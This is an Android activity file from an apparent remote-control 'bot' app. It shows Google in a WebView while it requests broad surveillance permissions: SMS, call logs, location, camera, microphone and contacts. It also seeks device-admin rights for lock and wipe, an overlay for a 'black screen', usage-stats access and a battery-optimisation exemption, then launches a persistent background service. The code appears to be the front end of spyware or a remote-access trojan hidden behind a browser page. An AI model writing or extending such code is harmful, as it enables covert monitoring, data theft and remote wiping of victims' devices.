package com.my.remotebot;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

public class MainActivity extends Activity {

    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int ADMIN_INTENT = 15;
    private static final int OVERLAY_PERMISSION_REQUEST = 101;
    private static final int USAGE_STATS_PERMISSION_REQUEST = 102;
    private static final int BATTERY_OPTIMIZATION_REQUEST = 103;

    private WebView webView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Set up WebView with Google
        webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setWebViewClient(new WebViewClient());
        webView.loadUrl("https://www.google.com");
        setContentView(webView);

        // Request runtime permissions (Android 6+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            requestAllPermissions();
        }

        // Device admin (for lock/wipe)
        ComponentName adminComponent = new ComponentName(this, DeviceAdmin.class);
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        if (dpm != null && !dpm.isAdminActive(adminComponent)) {
            try {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
								"Need admin for lock/unlock and wipe");
                startActivityForResult(intent, ADMIN_INTENT);
            } catch (Exception e) {
                Toast.makeText(this, "Device admin request failed: " + e.getMessage(), 
							   Toast.LENGTH_LONG).show();
                e.printStackTrace();
            }
        }

        // Overlay permission (for black screen and alerts) - Android 6+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
											   Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST);
                } catch (Exception e) {
                    Toast.makeText(this, "Overlay permission request failed: " + e.getMessage(), 
								   Toast.LENGTH_LONG).show();
                    e.printStackTrace();
                }
            }
        }

        // Usage stats permission (for phone activity) - Android 5+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (!hasUsageStatsPermission()) {
                try {
                    Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
                    startActivityForResult(intent, USAGE_STATS_PERMISSION_REQUEST);
                } catch (Exception e) {
                    Toast.makeText(this, "Usage stats permission request failed: " + e.getMessage(), 
								   Toast.LENGTH_LONG).show();
                    e.printStackTrace();
                }
            }
        }

        // Ignore battery optimizations - Android 6+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ignoreBatteryOptimization();
        }

        // Start the bot service
        startBotService();
    }

    private void requestAllPermissions() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return;

        String[] permissions = {
            Manifest.permission.CAMERA,
            Manifest.permission.VIBRATE,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_PHONE_STATE
        };

        // Check if any permission is not granted
        boolean shouldRequest = false;
        for (String perm : permissions) {
            if (checkSelfPermission(perm) != PackageManager.PERMISSION_GRANTED) {
                shouldRequest = true;
                break;
            }
        }

        if (shouldRequest) {
            requestPermissions(permissions, PERMISSION_REQUEST_CODE);
        }
    }

    private void ignoreBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm == null) return;
            String packageName = getPackageName();
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(Uri.parse("package:" + packageName));
                    startActivityForResult(intent, BATTERY_OPTIMIZATION_REQUEST);
                } catch (Exception e) {
                    Toast.makeText(this, "Battery optimization request failed: " + e.getMessage(), 
								   Toast.LENGTH_LONG).show();
                    e.printStackTrace();
                }
            }
        }
    }

    private boolean hasUsageStatsPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            android.app.usage.UsageStatsManager usm = 
                (android.app.usage.UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);
            if (usm == null) return false;
            long time = System.currentTimeMillis();
            java.util.List<android.app.usage.UsageStats> stats = 
                usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_DAILY, 
                                    time - 1000 * 3600 * 24, time);
            return (stats != null && !stats.isEmpty());
        }
        return false;
    }

    private void startBotService() {
        Intent intent = new Intent(this, BotService.class);
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
            Toast.makeText(this, "Bot Service Started", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Toast.makeText(this, "Failed to start service: " + e.getMessage(), 
						   Toast.LENGTH_LONG).show();
            e.printStackTrace();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults == null || grantResults.length == 0) return;
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted) {
                Toast.makeText(this, "All permissions granted", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "Some permissions denied. Features may not work.", 
							   Toast.LENGTH_LONG).show();
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        switch (requestCode) {
            case ADMIN_INTENT:
                if (resultCode == RESULT_OK) {
                    Toast.makeText(this, "Device admin granted", Toast.LENGTH_SHORT).show();
                } else {
                    Toast.makeText(this, "Device admin required for lock/wipe", 
								   Toast.LENGTH_SHORT).show();
                }
                break;
            case OVERLAY_PERMISSION_REQUEST:
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) {
                    Toast.makeText(this, "Overlay permission granted", Toast.LENGTH_SHORT).show();
                } else {
                    Toast.makeText(this, "Overlay permission denied. Black screen and alerts may not work.", 
								   Toast.LENGTH_LONG).show();
                }
                break;
            case USAGE_STATS_PERMISSION_REQUEST:
                if (hasUsageStatsPermission()) {
                    Toast.makeText(this, "Usage stats permission granted", Toast.LENGTH_SHORT).show();
                } else {
                    Toast.makeText(this, "Usage stats permission denied. Phone activity may not work.", 
								   Toast.LENGTH_LONG).show();
                }
                break;
            case BATTERY_OPTIMIZATION_REQUEST:
                // No need to check result; user may have granted or denied
                break;
        }
    }

    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }
}
